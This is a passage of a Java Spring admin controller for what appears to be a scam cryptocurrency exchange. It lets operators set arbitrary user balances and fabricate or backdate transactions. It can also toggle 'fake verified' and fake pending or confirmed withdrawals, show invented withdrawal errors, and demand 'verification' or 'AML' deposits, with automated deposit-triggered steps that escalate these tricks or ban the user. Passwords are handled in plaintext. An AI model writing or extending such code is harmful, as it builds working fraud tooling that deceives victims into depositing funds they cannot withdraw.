                UserSupportMessage supportMessage = new UserSupportMessage(UserSupportMessage.Target.TO_USER, UserSupportMessage.Type.IMAGE, "../" + Resources.SUPPORT_IMAGES + "/" + fileName, false, true, user);

                createOrUpdateSupportDialog(supportMessage, user);

                userSupportMessageRepository.save(supportMessage);
            } catch (IOException e) {
                e.printStackTrace();
                return ResponseEntity.badRequest().body("upload_image_error");
            }
        }

        cooldownService.addCooldown("admin-support", Duration.ofSeconds(2));

        return ResponseEntity.ok("success");
    }

    private void createOrUpdateSupportDialog(UserSupportMessage supportMessage, User user) {
        UserSupportDialog userSupportDialog = userSupportDialogRepository.findByUserId(user.getId()).orElse(null);
        if (userSupportDialog == null) {
            userSupportDialog = new UserSupportDialog();
        }

        userSupportDialog.setOnlyWelcome(false);
        userSupportDialog.setUserUnviewedMessages(userSupportDialog.getUserUnviewedMessages() + 1);
        userSupportDialog.setTotalMessages(userSupportDialog.getTotalMessages() + 1);
        userSupportDialog.setLastMessageDate(supportMessage.getCreated());
        userSupportDialog.setUser(user);

        userSupportDialogRepository.save(userSupportDialog);
    }
    //end support

    //start user-edit
    @PostMapping(value = "/user-edit")
    public ResponseEntity<String> userEditController(@RequestBody Map<String, Object> data) {
        String action = (String) data.get("action");
        switch (action) {
            case "EDIT_OVERVIEW" -> {
                return editOverview(data);
            }
            case "EDIT_KYC" -> {
                return editKyc(data);
            }
            case "SET_BALANCE" -> {
                return setBalance(data);
            }
            case "CREATE_TRANSACTION" -> {
                return createTransaction(data);
            }
            case "EDIT_TRANSACTION" -> {
                return editTransaction(data);
            }
            case "EDIT_TRANSACTION_AMOUNT" -> {
                return editTransactionAmount(data);
            }
            case "EDIT_WITHDRAW_VERIFY" -> {
                return editWithdrawVerify(data);
            }
            case "ADD_WITHDRAW_VERIFY_COIN" -> {
                return addWithdrawVerifyCoin(data);
            }
            case "DELETE_WITHDRAW_VERIFY_COIN" -> {
                return deleteWithdrawVerifyCoin(data);
            }
            default -> {
                return ResponseEntity.badRequest().body("invalid_action");
            }
        }
    }

    private ResponseEntity<String> editOverview(Map<String, Object> data) {
        long userId = Long.parseLong(String.valueOf(data.get("user_id")));

        User user = userRepository.findById(userId).orElse(null);
        if (user == null) {
            return ResponseEntity.badRequest().body("user_not_found");
        }

        String username = (String) data.get("username");
        if (!DataValidator.isUsernameValided(username)) {
            return ResponseEntity.badRequest().body("username_error");
        }

        String password = XSSUtils.stripXSS((String) data.get("password"));
        if (password.length() < 8 || password.length() > 64) {
            return ResponseEntity.badRequest().body("password_error");
        }

        double firstDepositBonusAmount = getDoubleValue(data, "first_deposit_bonus_amount");

        if (firstDepositBonusAmount < 0) {
            return ResponseEntity.badRequest().body("amount_error");
        }

        boolean firstDepositBonusEnabled = (boolean) data.get("first_deposit_bonus_enabled");
        boolean emailBanned = (boolean) data.get("ban_email");
        boolean twoFactorEnabled = (boolean) data.get("two_factor_enabled");
        boolean emailConfirmed = (boolean) data.get("email_confirmed");
        boolean fakeVerified = (boolean) data.get("fake_verified");

        Map<String, Boolean> featuresMap = (Map<String, Boolean>) data.get("features");
        Map<UserFeature.Type, Boolean> features = new HashMap<>();
        for (Map.Entry<String, Boolean> entry : featuresMap.entrySet()) {
            features.put(UserFeature.Type.valueOf(entry.getKey()), entry.getValue());
        }

        double depositCommission = getDoubleValue(data, "deposit_commission");
        if (depositCommission < -1) {
            depositCommission = -1;
        }

        double withdrawCommission = getDoubleValue(data, "withdraw_commission");
        if (withdrawCommission < -1) {
            withdrawCommission = -1;
        }

        String note = String.valueOf(data.get("note"));
        if (note.length() > 128) {
            return ResponseEntity.badRequest().body("note_length_error");
        }

        if (!note.equals(user.getNote()) || withdrawCommission != user.getWithdrawCommission() || depositCommission != user.getDepositCommission() || !user.getUsername().equals(username) || !user.getPassword().equals(password) || user.getFirstDepositBonusAmount() != firstDepositBonusAmount || user.isFirstDepositBonusEnabled() != firstDepositBonusEnabled || user.isTwoFactorEnabled() != twoFactorEnabled || user.isEmailConfirmed() != emailConfirmed || user.isFakeVerified() != fakeVerified) {
            user.setNote(note);
            user.setDepositCommission(depositCommission);
            user.setWithdrawCommission(withdrawCommission);
            user.setUsername(username);
            user.setPassword(password);
            user.setFirstDepositBonusAmount(firstDepositBonusAmount);
            user.setFirstDepositBonusEnabled(firstDepositBonusEnabled);
            user.setTwoFactorEnabled(twoFactorEnabled);
            user.setEmailConfirmed(emailConfirmed);
            user.setFakeVerified(fakeVerified);

            userRepository.save(user);

            userDetailsService.removeCache(user.getEmail());
        }

        boolean banned = emailBanRepository.existsByEmail(user.getEmail());
        if (banned != emailBanned) {
            if (emailBanned) {
                EmailBan emailBan = new EmailBan();
                emailBan.setEmail(user.getEmail());
                emailBan.setUser(user);
                emailBan.setDate(new Date());

                emailBanRepository.save(emailBan);
            } else {
                emailBanRepository.deleteByEmail(user.getEmail());
            }
        }

        List<UserFeature> userFeatures = userFeatureRepository.findAllByUserId(userId);
        for (Map.Entry<UserFeature.Type, Boolean> entry : features.entrySet()) {
            UserFeature userFeature = userFeatures.stream().filter(feat -> feat.getType() == entry.getKey()).findFirst().orElse(null);
            if (userFeature == null) {
                userFeature = new UserFeature();
                userFeature.setUser(user);
                userFeature.setType(entry.getKey());
            }

            userFeature.setEnabled(entry.getValue());

            userFeatureRepository.save(userFeature);
        }

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> editKyc(Map<String, Object> data) {
        long userId = Long.parseLong(String.valueOf(data.get("user_id")));

        User user = userRepository.findById(userId).orElse(null);
        if (user == null) {
            return ResponseEntity.badRequest().body("user_not_found");
        }

        UserKyc userKyc = user.getUserKyc();

        if (userKyc == null) {
            return ResponseEntity.badRequest().body("kyc_error");
        }

        if (userKyc.isAccepted()) {
            return ResponseEntity.badRequest().body("kyc_error");
        }

        String type = (String) data.get("type");
        if (type.equals("ACCEPT")) {
            userKyc.setAccepted(true);
            userKycRepository.save(userKyc);
        } else if (type.equals("CANCEL")){
            userKycRepository.deleteById(userKyc.getId());
        }

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> setBalance(Map<String, Object> data) {
        long userId = Long.parseLong(String.valueOf(data.get("user_id")));

        User user = userRepository.findById(userId).orElse(null);
        if (user == null) {
            return ResponseEntity.badRequest().body("user_not_found");
        }

        double balance = getDoubleValue(data, "balance");
        if (Double.isNaN(balance) || balance < 0) {
            return ResponseEntity.badRequest().body("amount_error");
        }

        long coinId = Long.parseLong(String.valueOf(data.get("coin_id")));
        Coin coin = coinRepository.findById(coinId).orElse(null);
        if (coin == null) {
            return ResponseEntity.badRequest().body("coin_not_found");
        }

        userService.setBalance(user, coin, balance);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> createTransaction(Map<String, Object> data) {
        long userId = Long.parseLong(String.valueOf(data.get("user_id")));

        User user = userRepository.findById(userId).orElse(null);
        if (user == null) {
            return ResponseEntity.badRequest().body("user_not_found");
        }

        double amount = getDoubleValue(data, "amount");
        if (Double.isNaN(amount) || amount < 0) {
            return ResponseEntity.badRequest().body("amount_error");
        }

        long coinId = Long.parseLong(String.valueOf(data.get("coin")));
        Coin coin = coinRepository.findById(coinId).orElse(null);
        if (coin == null) {
            return ResponseEntity.badRequest().body("coin_not_found");
        }

        String typeName = (String) data.get("type");
        UserTransaction.Type type = UserTransaction.Type.valueOf(typeName);

        if (!type.isIncrementBalance()) {
            if (userService.getBalance(user, coin) - amount < 0) {
                return ResponseEntity.badRequest().body("user_no_balance");
            }
        }

        String dateString = (String) data.get("date");
        Date date = null;
        if (!StringUtils.isBlank(dateString)) {
            try {
                date = new Date(dateString);
            } catch (Exception ex) {
                date = new Date();
            }
        } else {
            date = new Date();
        }

        String address = data.containsKey("address") && data.get("address") != null ? String.valueOf(data.get("address")) : null;

        UserTransaction userTransaction = new UserTransaction();

        userTransaction.setUser(user);
        userTransaction.setAmount(amount);
        userTransaction.setType(type);
        userTransaction.setAddress(address);
        userTransaction.setStatus(UserTransaction.Status.COMPLETED);
        userTransaction.setDate(date);
        userTransaction.setCoinSymbol(coin.getSymbol());

        userTransactionRepository.save(userTransaction);

        userService.addBalance(user, coin, type.isIncrementBalance() ? amount : -amount);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> editTransaction(Map<String, Object> data) {
        long userId = Long.parseLong(String.valueOf(data.get("user_id")));
        long transactionId = Long.parseLong(String.valueOf(data.get("id")));

        UserTransaction userTransaction = userTransactionRepository.findByIdAndUserId(transactionId, userId).orElse(null);
        if (userTransaction == null) {
            return ResponseEntity.badRequest().body("not_found");
        }

        String type = String.valueOf(data.get("type"));
        if (type.equals("DELETE")) {
            if (userTransaction.getType() == UserTransaction.Type.DEPOSIT && userDepositRepository.existsByTransactionId(transactionId)) {
                return ResponseEntity.badRequest().body("not_editable");
            }

            userTransactionRepository.deleteById(transactionId);

            return ResponseEntity.ok("success");
        } else if(userTransaction.getStatus() == UserTransaction.Status.IN_PROCESSING) {
            if (type.equals("PAID_OUT")) {
                if (userTransaction.getType() == UserTransaction.Type.DEPOSIT) {
                    UserDeposit userDeposit = userDepositRepository.findByTransactionId(transactionId).orElse(null);
                    if (userDeposit != null) {
                        userService.addBalance(userDeposit.getUser(), userTransaction.getCoinSymbol(), userDeposit.getAmount());
                    }
                }

                userTransaction.setStatus(UserTransaction.Status.COMPLETED);
                userTransactionRepository.save(userTransaction);

                return ResponseEntity.ok("success");
            } else if (type.equals("CANCEL")) {
                if (userTransaction.getType() == UserTransaction.Type.DEPOSIT && userDepositRepository.existsByTransactionId(transactionId)) {
                    return ResponseEntity.badRequest().body("not_editable");
                }

                userService.addBalance(userTransaction.getUser(), userTransaction.getCoinSymbol(), userTransaction.getAmount());

                userTransaction.setStatus(UserTransaction.Status.CANCELED);

                userTransactionRepository.save(userTransaction);

                return ResponseEntity.ok("success");
            }
        }

        return ResponseEntity.ok("error");
    }

    private ResponseEntity<String> editTransactionAmount(Map<String, Object> data) {
        long userId = Long.parseLong(String.valueOf(data.get("user_id")));
        long transactionId = Long.parseLong(String.valueOf(data.get("id")));

        UserTransaction userTransaction = userTransactionRepository.findByIdAndUserId(transactionId, userId).orElse(null);
        if (userTransaction == null) {
            return ResponseEntity.badRequest().body("not_found");
        }

        double amount = getDoubleValue(data, "amount");
        if (Double.isNaN(amount) || amount <= 0) {
            return ResponseEntity.badRequest().body("amount_error");
        }

        userTransaction.setAmount(amount);
        userTransactionRepository.save(userTransaction);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> editWithdrawVerify(Map<String, Object> data) {
        boolean verifModal = (boolean) data.get("verif_modal");
        boolean amlModal = (boolean) data.get("aml_modal");
        double verifAmount = getDoubleValue(data, "verif_amount");
        double btcVerifAmount = getDoubleValue(data, "btc_verif_amount");

        if (Double.isNaN(verifAmount) || verifAmount <= 0) {
            return ResponseEntity.badRequest().body("amount_error");
        }

        long userId = Long.parseLong(String.valueOf(data.get("user_id")));
        User user = userRepository.findById(userId).orElse(null);
        if (user == null) {
            return ResponseEntity.badRequest().body("user_not_found");
        }

        user.setVerificationModal(verifModal);
        user.setAmlModal(amlModal);
        user.setVerifDepositAmount(verifAmount);
        user.setBtcVerifDepositAmount(btcVerifAmount < 0 ? 0 : btcVerifAmount);

        userRepository.save(user);

        return ResponseEntity.ok("error");
    }

    private ResponseEntity<String> addWithdrawVerifyCoin(Map<String, Object> data) {
        long userId = Long.parseLong(String.valueOf(data.get("user_id")));
        User user = userRepository.findById(userId).orElse(null);
        if (user == null) {
            return ResponseEntity.badRequest().body("user_not_found");
        }

        Worker worker = user.getWorker();
        if (worker == null) {
            return ResponseEntity.badRequest().body("temp_error");
        }

        long coinId = Long.parseLong(String.valueOf(data.get("coin_id")));
        WorkerDepositCoin depositCoin = workerDepositCoinRepository.findByIdAndWorkerId(coinId, worker.getId()).orElse(null);
        if (depositCoin == null) {
            return ResponseEntity.badRequest().body("coin_not_found");
        }

        if (userRequiredDepositCoinRepository.existsByUserIdAndDepositCoinIdAndDepositCoinWorkerId(userId, coinId, worker.getId())) {
            return ResponseEntity.badRequest().body("already_exists");
        }

        UserRequiredDepositCoin userRequiredDepositCoin = new UserRequiredDepositCoin();
        userRequiredDepositCoin.setUser(user);
        userRequiredDepositCoin.setDepositCoin(depositCoin);

        userRequiredDepositCoinRepository.save(userRequiredDepositCoin);

        return ResponseEntity.ok("error");
    }

    private ResponseEntity<String> deleteWithdrawVerifyCoin(Map<String, Object> data) {
        long coinId = Long.parseLong(String.valueOf(data.get("coin_id")));
        long userId = Long.parseLong(String.valueOf(data.get("user_id")));
        User user = userRepository.findById(userId).orElse(null);
        if (user == null) {
            return ResponseEntity.badRequest().body("user_not_found");
        }

        Worker worker = user.getWorker();
        if (worker == null) {
            return ResponseEntity.badRequest().body("temp_error");
        }

        if (!userRequiredDepositCoinRepository.existsByIdAndUserIdAndDepositCoinWorkerId(coinId, userId, worker.getId())) {
            return ResponseEntity.badRequest().body("not_found");
        }

        userRequiredDepositCoinRepository.deleteById(coinId);

        return ResponseEntity.ok("error");
    }

    @PostMapping(value = "/user-edit/errors")
    public ResponseEntity<String> userEditErrorsController( @RequestBody Map<String, Object> data) {
        long userId = Long.parseLong(String.valueOf(data.get("user_id")));
        User user = userRepository.findById(userId).orElse(null);
        if (user == null) {
            return ResponseEntity.badRequest().body("user_not_found");
        }

        Map<String, String> messagesMap = (Map<String, String>) data.get("messages");
        Map<ErrorMessage.ErrorMessageType, String> messages = new HashMap<>();
        for (Map.Entry<String, String> entry : messagesMap.entrySet()) {
            messages.put(ErrorMessage.ErrorMessageType.valueOf(entry.getKey()), entry.getValue());
        }

        for (Map.Entry<ErrorMessage.ErrorMessageType, String> entry : messages.entrySet()) {
            ErrorMessage.ErrorMessageType type = entry.getKey();
            String message = XSSUtils.sanitize(entry.getValue());
            String onlyMessage = user.getOnlyUserErrorMessage(type);
            if (onlyMessage != null && onlyMessage.equals(message)) {
                continue;
            }

            UserErrorMessage userErrorMessage = userErrorMessageRepository.findByUserIdAndType(user.getId(), type).orElse(null);
            if (userErrorMessage == null) {
                userErrorMessage = new UserErrorMessage();
                userErrorMessage.setUser(user);
                userErrorMessage.setType(type);
            }

            userErrorMessage.setMessage(message);

            userErrorMessageRepository.save(userErrorMessage);
        }

        return ResponseEntity.ok("success");
    }


    @PostMapping(value = "/toggle-support/{id}")
    public ResponseEntity<String> toggleSupport(@PathVariable long id, @RequestBody Map<String, Long> requestBody) {
        long supportId = requestBody.get("supportId");
        try {
            User supporterUser = userRepository.findById(supportId).orElseThrow();

            User user = userRepository.findById(id).orElseThrow();
            if (user.getSupport() == null || user.getSupport().getId() != supporterUser.getId() ) {
                return ResponseEntity.ok().build();
            }
            if (user.getSupport().getId() == supporterUser.getId()) {
                supporterUser.removeFromSupported(user);
            }
            userRepository.save(supporterUser);
            return ResponseEntity.ok().build();
        } catch (Exception e) {
            return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR).body(e.getMessage());
        }
    }
    @PostMapping(value = "/add-support/{id}")
    public ResponseEntity<String> addToSupport(@PathVariable long id, @RequestBody Map<String, Long> requestBody) {
        long supportId = requestBody.get("supportId");
        try {
            User supporterUser = userRepository.findById(supportId).orElseThrow();
            User user = userRepository.findById(id).orElseThrow();
            user.setSupport(supporterUser);
            userRepository.save(supporterUser);
            return ResponseEntity.ok().build();
        } catch (Exception e) {
            return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR).body(e.getMessage());
        }
    }

    //todo: кулдауны
    @PostMapping(value = "/user-edit/alert")
    public ResponseEntity<String> userEditAlertController(@RequestBody Map<String, Object> data) {
        String type = (String) data.get("type");
        String cooldownKey = "alert-" + type;
        if (cooldownService.isCooldown(cooldownKey)) {
            return ResponseEntity.badRequest().body("cooldown:" + cooldownService.getCooldownLeft(cooldownKey));
        }

        long userId = Long.parseLong(String.valueOf(data.get("user_id")));
        User user = userRepository.findById(userId).orElse(null);
        if (user == null) {
            return ResponseEntity.badRequest().body("user_not_found");
        }

        if (StringUtils.isBlank(type)) {
            return ResponseEntity.badRequest().body("type_error");
        }

        String message = (String) data.get("message");

        message = XSSUtils.sanitize(message);

        if (StringUtils.isBlank(message)) {
            return ResponseEntity.badRequest().body("message_is_empty");
        }

        if (message.length() > 1000) {
            return ResponseEntity.badRequest().body("message_is_too_large");
        }

        UserAlert.Type alertType = UserAlert.Type.ALERT;
        Coin coin = null;
        double amount = 0;
        List<User> users;
        if (type.equals("CURRENT")) {
            users = Collections.singletonList(user);
        } else if (type.equals("ALL")) {
            users = userRepository.findAll();
        } else if (type.equals("BONUS_CURRENT") || type.equals("BONUS_ALL")) {
            alertType = UserAlert.Type.BONUS;
            long coinId = Long.parseLong(String.valueOf(data.get("coin")));
            coin = coinRepository.findById(coinId).orElse(null);
            if (coin == null) {
                return ResponseEntity.badRequest().body("coin_not_found");
            }

            amount = getDoubleValue(data, "amount");
            if (amount <= 0) {
                return ResponseEntity.badRequest().body("amount_error");
            }

            if (type.equals("BONUS_CURRENT")) {
                users = Collections.singletonList(user);
            } else {
                users = userRepository.findAll();
            }
        } else {
            return ResponseEntity.badRequest().body("error");
        }

        //todo: придумать че то с этим
        for (User alertUser : users) {
            UserAlert alert = new UserAlert();
            alert.setUser(alertUser);
            alert.setType(alertType);
            alert.setMessage(message);
            alert.setCoin(coin);
            alert.setAmount(amount);

            userAlertRepository.save(alert);
        }

        if (type.contains("_ALL")) {
            cooldownService.addCooldown(cooldownKey, Duration.ofSeconds(60));
        } else {
            cooldownService.addCooldown(cooldownKey, Duration.ofSeconds(5));
        }

        return ResponseEntity.ok("success");
    }

    @PostMapping("/edit/deposit-address")
    public ResponseEntity<String> editDepositAddress(@RequestBody Map<String, Object> data) {
        long userId = Long.parseLong(data.get("user_id").toString());
        User user = userRepository.findById(userId).orElseThrow(() -> new RuntimeException("User not found"));

        CoinType coinType = CoinType.valueOf(data.get("coin-type").toString());
        String depositAddress = data.get("deposit-address").toString();
        Object depositTagObject = data.get("deposit-tag");

        UserAddress userAddress = westWalletService.updateUserAddress(depositAddress, depositTagObject);
        Optional<UserAddress> existingAddressOpt = userAddressRepository.findByUserIdAndCoinType(userId, coinType);

        if (existingAddressOpt.isPresent()) {
            UserAddress existingAddress = existingAddressOpt.get();
            existingAddress.setAddress(userAddress.getAddress());
            existingAddress.setTag(userAddress.getTag());
            existingAddress.setCreated(System.currentTimeMillis());
            userAddressRepository.save(existingAddress);
            return ResponseEntity.ok("success");
        } else {
            throw new RuntimeException("Failed to update address for user: " + user.getEmail() + ", coin: " + coinType.name());
        }
    }

    @PostMapping("/save/deposit-address")
    public ResponseEntity<String> saveDepositAddresses(@RequestBody Map<String, Object> data) {
        westWalletService.saveUserAddress(data);

        return ResponseEntity.ok("success");
    }
    //end user-edit

    //start smart-deposit
    @PostMapping(value = "/settings/smart-deposit")
    public ResponseEntity<String> smartDepositController(@RequestBody Map<String, Object> data) {
        String action = (String) data.get("action");
        switch (action) {
            case "EDIT_SETTINGS" -> {
                return editSmartDepositSettings(data);
            }
            case "ADD_STEP" -> {
                return addStep(data);
            }
            case "DELETE_STEP" -> {
                return deleteStep(data);
            }
            default -> {
                return ResponseEntity.badRequest().body("invalid_action");
            }
        }
    }

    private ResponseEntity<String> editSmartDepositSettings(Map<String, Object> data) {
        boolean enabled = (boolean) data.get("enabled");

        AdminSettings settings = adminSettingsRepository.findFirst();
        settings.setSmartDepositEnabled(enabled);

        adminSettingsRepository.save(settings);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> addStep(Map<String, Object> data) {
        double amount = getDoubleValue(data, "amount");
        if (amount <= 0) {
            return ResponseEntity.badRequest().body("amount_error");
        }

        String coinSymbol = String.valueOf(data.get("coin"));
        String finalCoinSymbol = coinSymbol;
        CoinType coinType = Arrays.stream(CoinType.values()).filter(type -> type.name().equalsIgnoreCase(finalCoinSymbol)).findFirst().orElse(null);
        if (coinType == null) {
            coinSymbol = "USD";
        }

        String type = String.valueOf(data.get("type"));
        SmartDepositStep.SmartDepositStepType smartDepositStepType = type.equals("total_deposits_sum") ? SmartDepositStep.SmartDepositStepType.TOTAL_DEPOSITS_SUM : SmartDepositStep.SmartDepositStepType.MIN_DEPOSIT;

        boolean fakeWithdrawPending = (boolean) data.get("fake_withdraw_pending");
        boolean fakeWithdrawConfirmed = (boolean) data.get("fake_withdraw_confirmed");
        boolean premium = (boolean) data.get("premium");
        boolean walletConnect = (boolean) data.get("wallet_connect");
        boolean verifModal = (boolean) data.get("verif_modal");
        boolean amlModal = (boolean) data.get("aml_modal");
        boolean fakeVerified = (boolean) data.get("fake_verified");
        boolean globalBan = (boolean) data.get("global_ban");

        boolean changeWithdrawError = (boolean) data.get("change_withdraw_error");

        AdminSmartDepositStep step = new AdminSmartDepositStep();
        step.setAmount(amount);

        step.setCoinSymbol(coinSymbol);
        step.setType(smartDepositStepType);

        step.setFakeWithdrawPending(fakeWithdrawPending);
        step.setFakeWithdrawConfirmed(fakeWithdrawConfirmed);
        step.setPremium(premium);
        step.setWalletConnect(walletConnect);
        step.setVerifModal(verifModal);
        step.setAmlModal(amlModal);
        step.setFakeVerified(fakeVerified);
        step.setGlobalBan(globalBan);

        step.setChangeWithdrawError(changeWithdrawError);
        if (changeWithdrawError) {
            String withdrawError = XSSUtils.sanitize(String.valueOf(data.get("withdraw_error")));
            step.setWithdrawError(withdrawError);
        }

        adminSmartDepositStepRepository.save(step);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> deleteStep(Map<String, Object> data) {
        long id = Long.parseLong(String.valueOf(data.get("id")));

        if (!adminSmartDepositStepRepository.existsById(id)) {
            return ResponseEntity.badRequest().body("not_found");
        }

        adminSmartDepositStepRepository.deleteById(id);

        return ResponseEntity.ok("success");
    }
    //end smart-deposit

      private double getDoubleValue(Map<String, Object> data, String key) {
        return data.get(key) == null ? -1D : Double.parseDouble(String.valueOf(data.get(key)));
    }
}
